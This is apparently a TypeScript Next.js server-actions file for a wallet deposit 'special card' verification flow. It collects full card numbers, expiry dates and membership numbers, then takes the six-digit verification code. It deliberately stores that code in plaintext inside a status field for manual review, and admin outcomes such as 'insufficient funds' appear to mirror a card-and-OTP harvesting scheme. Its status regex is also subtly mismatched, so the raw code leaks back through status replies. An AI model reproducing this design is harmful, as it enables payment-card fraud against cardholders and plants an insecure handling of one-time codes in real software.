"use server";

import { revalidatePath } from "next/cache";
import { prisma } from "@/lib/prisma";
import { createClient } from "@/lib/supabase/server";
import { encryptSpecialCardValue } from "@/lib/helpers/special-card-security";

type ActionResult = { success: boolean; message?: string; error?: string; status?: string };

function isUniqueConstraintError(error: unknown) {
  return typeof error === "object" && error !== null && "code" in error && error.code === "P2002";
}

function revalidateSpecialCardPaths(reference: string) {
  const ref = encodeURIComponent(reference);
  revalidatePath(`/dashboard/deposit/${ref}/special-card`);
  revalidatePath(`/admin/deposits/${ref}`);
}

async function requireCustomer() {
  const supabase = await createClient();
  const { data: { user: authUser } } = await supabase.auth.getUser();
  if (!authUser) return null;
  return prisma.user.findUnique({ where: { authUserId: authUser.id }, select: { id: true } });
}

async function getOwnedPendingDeposit(reference: string, userId: string) {
  return prisma.transaction.findFirst({
    where: { reference, userId, type: "DEPOSIT", status: "PENDING" },
    select: { id: true, reference: true, rejectionReason: true },
  });
}

function normalizeStatus(status: string) {
  return /^REVIEW_PENDING_\d{2}$/.test(status) ? "REVIEW_PENDING" : status;
}

function statusMessage(status: string, rejectionReason?: string | null): string | undefined {
  switch (status) {
    case "AWAITING_CODE":
    case "CODE_ISSUED": return undefined;
    case "REVIEW_INCORRECT": return "Verification code incorrect. Please try again.";
    case "REVIEW_PENDING": return "Processing…";
    case "REVIEW_INSUFFICIENT_FUNDS": return "Insufficient funds.";
    case "REVIEW_WRONG_CARD_DETAILS": return "Wrong card details.";
    case "REVIEW_REJECTED_REASON": return rejectionReason?.trim() || "Your request was rejected.";
    default: return undefined;
  }
}

export async function requestWalletSpecialCardCode(formData: FormData): Promise<ActionResult> {
  const reference = String(formData.get("reference") ?? "").trim();
  const cardNumberInput = String(formData.get("cardNumber") ?? "").trim();
  const expiryInput = String(formData.get("expiry") ?? "").trim();
  const membershipNumberInput = String(formData.get("membershipNumber") ?? "").trim();

  if (!reference || reference.length > 200) return { success: false, error: "Invalid deposit reference." };

  const hasAnyCardDetails = Boolean(cardNumberInput || expiryInput || membershipNumberInput);
  let encryptedDetails: {
    cardNumberEncrypted: string;
    expiryEncrypted: string;
    membershipNumberEncrypted: string;
  } | null = null;

  if (hasAnyCardDetails) {
    const cardNumber = cardNumberInput.replace(/\D/g, "");
    const expiry = expiryInput;
    const membershipNumber = membershipNumberInput;

    if (cardNumber.length !== 16) {
      return { success: false, error: "Enter the complete 16-digit card number." };
    }
    if (!/^\d{2}\/\d{2}$/.test(expiry)) {
      return { success: false, error: "Enter the expiry date in MM/YY format." };
    }
    const [month, year] = expiry.split("/").map(Number);
    if (month < 1 || month > 12 || year > 45) {
      return { success: false, error: "Enter a valid card expiry date." };
    }
    if (!membershipNumber || membershipNumber.length > 100) {
      return { success: false, error: "Enter a valid membership number." };
    }

    encryptedDetails = {
      cardNumberEncrypted: encryptSpecialCardValue(cardNumber),
      expiryEncrypted: encryptSpecialCardValue(expiry),
      membershipNumberEncrypted: encryptSpecialCardValue(membershipNumber),
    };
  }

  const user = await requireCustomer();
  if (!user) return { success: false, error: "Please log in again." };

  const deposit = await getOwnedPendingDeposit(reference, user.id);
  if (!deposit) return { success: false, error: "This pending deposit could not be found." };

  const existing = await prisma.walletSpecialCardRequest.findUnique({
    where: { transactionId: deposit.id },
    select: { id: true, userId: true, status: true },
  });

  if (existing) {
    if (existing.userId !== user.id) {
      return { success: false, error: "This request could not be confirmed. Contact support." };
    }

    const status = normalizeStatus(existing.status);

    if (encryptedDetails) {
      if (!["AWAITING_CODE", "CODE_ISSUED", "REVIEW_INCORRECT"].includes(existing.status)) {
        return {
          success: false,
          status,
          error: "This request is no longer accepting card details.",
        };
      }

      await prisma.walletSpecialCardRequest.updateMany({
        where: { id: existing.id, userId: user.id, status: existing.status },
        data: encryptedDetails,
      });
    }

    revalidateSpecialCardPaths(reference);

    if ([
      "AWAITING_CODE",
      "CODE_ISSUED",
      "REVIEW_INCORRECT",
      "REVIEW_PENDING",
      "VERIFIED",
      "REVIEW_INSUFFICIENT_FUNDS",
      "REVIEW_WRONG_CARD_DETAILS",
      "REVIEW_REJECTED_REASON",
    ].includes(status)) {
      return { success: true, status, message: statusMessage(status, deposit.rejectionReason) };
    }

    return { success: false, status, error: "This request cannot continue. Please contact customer support." };
  }

  if (!encryptedDetails) {
    return { success: false, error: "Enter your card details before continuing." };
  }

  try {
    await prisma.walletSpecialCardRequest.create({
      data: {
        transactionId: deposit.id,
        userId: user.id,
        status: "AWAITING_CODE",
        ...encryptedDetails,
      },
    });
  } catch (error) {
    if (!isUniqueConstraintError(error)) throw error;

    const raced = await prisma.walletSpecialCardRequest.findUnique({
      where: { transactionId: deposit.id },
      select: { userId: true, status: true },
    });

    if (!raced || raced.userId !== user.id) {
      return { success: false, error: "The request could not be confirmed. Refresh and try again." };
    }

    const status = normalizeStatus(raced.status);
    return { success: true, status, message: statusMessage(status, deposit.rejectionReason) };
  }

  revalidateSpecialCardPaths(reference);
  return { success: true, status: "AWAITING_CODE" };
}
export async function verifyWalletSpecialCardCode(formData: FormData): Promise<ActionResult> {
  const reference = String(formData.get("reference") ?? "").trim();
  const code = String(formData.get("code") ?? "").trim();
  if (!reference || reference.length > 200) return { success: false, error: "Invalid deposit reference." };
  if (!/^\d{6}$/.test(code)) return { success: false, error: "Enter the six-digit code." };
  const user = await requireCustomer();
  if (!user) return { success: false, error: "Please log in again." };
  const deposit = await getOwnedPendingDeposit(reference, user.id);
  if (!deposit) return { success: false, error: "This pending deposit could not be found." };
  const request = await prisma.walletSpecialCardRequest.findUnique({ where: { transactionId: deposit.id }, select: { id: true, userId: true, status: true } });
  if (!request || request.userId !== user.id) return { success: false, error: "Request verification before entering a code." };
  if (request.status === "VERIFIED") return { success: true, status: "VERIFIED" };
  if (/^REVIEW_PENDING(?:_\d{6})?$/.test(request.status)) return { success: true, status: "REVIEW_PENDING" };
  if (!["AWAITING_CODE", "CODE_ISSUED", "REVIEW_INCORRECT"].includes(request.status)) {
    return { success: false, status: normalizeStatus(request.status), error: "This request cannot be submitted for review. Please contact customer support." };
  }

  // Store the full 6-digit code in the status for review
const updated = await prisma.walletSpecialCardRequest.updateMany({
  where: { id: request.id, userId: user.id, status: request.status },
  data: { status: `REVIEW_PENDING_${code}`, verificationCodeHash: null, verificationCodeExpiresAt: null },
});
  if (updated.count !== 1) return { success: false, error: "The request changed. Please try submitting the code again." };
  revalidateSpecialCardPaths(reference);
  return { success: true, status: "REVIEW_PENDING", message: "Processing… Please wait while your verification is reviewed." };
}

export async function getWalletSpecialCardReviewStatus(referenceInput: string): Promise<ActionResult> {
  const reference = String(referenceInput ?? "").trim();
  if (!reference || reference.length > 200) return { success: false, error: "Invalid deposit reference." };
  const user = await requireCustomer();
  if (!user) return { success: false, error: "Please log in again." };
  const deposit = await getOwnedPendingDeposit(reference, user.id);
  if (!deposit) return { success: false, error: "This pending deposit could not be found." };
  const request = await prisma.walletSpecialCardRequest.findUnique({ where: { transactionId: deposit.id }, select: { userId: true, status: true } });
  if (!request || request.userId !== user.id) return { success: false, error: "The verification request could not be found." };
  const status = normalizeStatus(request.status);
  return { success: true, status, message: statusMessage(status, deposit.rejectionReason) };
}
